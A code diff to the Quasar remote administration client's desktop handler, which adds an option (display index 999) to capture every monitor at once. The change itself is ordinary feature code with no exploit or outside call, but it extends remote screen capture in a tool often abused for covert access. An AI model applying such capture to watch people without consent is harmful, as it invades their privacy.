@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Helper;
+using Quasar.Client.Helper;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
@@ -46,7 +46,18 @@ namespace Quasar.Client.Messages
         {
             // TODO: Switch to streaming mode without request-response once switched from windows forms
             // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
-            var monitorBounds = ScreenHelper.GetBounds((message.DisplayIndex));
+            
+            // Special case: DisplayIndex 999 means capture ALL monitors
+            Rectangle monitorBounds;
+            if (message.DisplayIndex == 999)
+            {
+                monitorBounds = ScreenHelper.GetAllScreensBounds();
+            }
+            else
+            {
+                monitorBounds = ScreenHelper.GetBounds(message.DisplayIndex);
+            }
+            
             var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
 
             if (_streamCodec == null)
@@ -70,7 +81,16 @@ namespace Quasar.Client.Messages
             Bitmap desktop = null;
             try
             {
-                desktop = ScreenHelper.CaptureScreen(message.DisplayIndex);
+                // Capture all screens if DisplayIndex is 999
+                if (message.DisplayIndex == 999)
+                {
+                    desktop = ScreenHelper.CaptureAllScreens();
+                }
+                else
+                {
+                    desktop = ScreenHelper.CaptureScreen(message.DisplayIndex);
+                }
+                
                 desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                     ImageLockMode.ReadWrite, desktop.PixelFormat);
 
